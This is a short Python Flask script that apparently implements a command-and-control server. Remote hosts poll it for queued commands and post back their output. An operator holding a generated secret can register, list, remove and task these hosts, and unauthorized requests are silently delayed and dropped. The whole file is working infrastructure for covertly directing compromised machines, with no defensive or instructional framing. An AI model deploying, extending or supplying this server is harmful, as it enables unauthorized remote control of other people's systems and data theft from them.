#!/usr/bin/env python3
import argparse
import collections
import datetime
import random
import string
import time
import flask

app = flask.Flask(__name__)

secret = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(8))

hosts = {}

max_content_length = 8196

@app.route('/', methods=['POST'])
def index():
    if flask.request.content_length > max_content_length:
        time.sleep(1)
        return ''
    iden, output = flask.request.get_data(cache=False, as_text=True).split(':', 1)
    if iden not in hosts:
        time.sleep(1)
        return ''
    hosts[iden]['tim'] = datetime.datetime.utcnow()
    if output:
        hosts[iden]['out'].append((datetime.datetime.utcnow(), '_', output))
    return ':'.join(hosts[iden]['cmd'].popleft()) if hosts[iden]['cmd'] else ''
    
@app.route('/cmd', methods=['POST'])
def command():
    if flask.request.content_length > max_content_length:
        time.sleep(1)
        return ''
    key, cmd, iden, parameters = flask.request.get_data(cache=False, as_text=True).split(':', 3)
    if key != secret:
        time.sleep(1)
        return ''
    if cmd == 'L':
        return '\n'.join('{},{}'.format(k, v.get('tim', '')) for k, v in hosts.items())
    if cmd == 'R' and iden not in hosts:
        hosts[iden] = {'cmd': collections.deque(), 'out': collections.deque()}
        return 'OK'
    if cmd == 'U' and iden in hosts:
        hosts.pop(iden)
        return 'OK'
    if cmd == 'I' and iden in hosts:
        return '\n'.join('{},{},{}'.format(t, c, o) for t, c, o in hosts[iden]['out'])
    if cmd in ['T', 'N', 'C'] and iden in hosts:
        hosts[iden]['out'].append((datetime.datetime.utcnow(), cmd, parameters))
        hosts[iden]['cmd'].append((cmd, parameters))
        return 'OK'
    return ''

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--cert')
    parser.add_argument('--key')
    args = parser.parse_args()
    sslconfig = (args.cert, args.key) if args.cert and args.key else None
    print('SECRET:', secret)
    app.run(host='0.0.0.0', port=args.port, ssl_context=sslconfig, threaded=True)
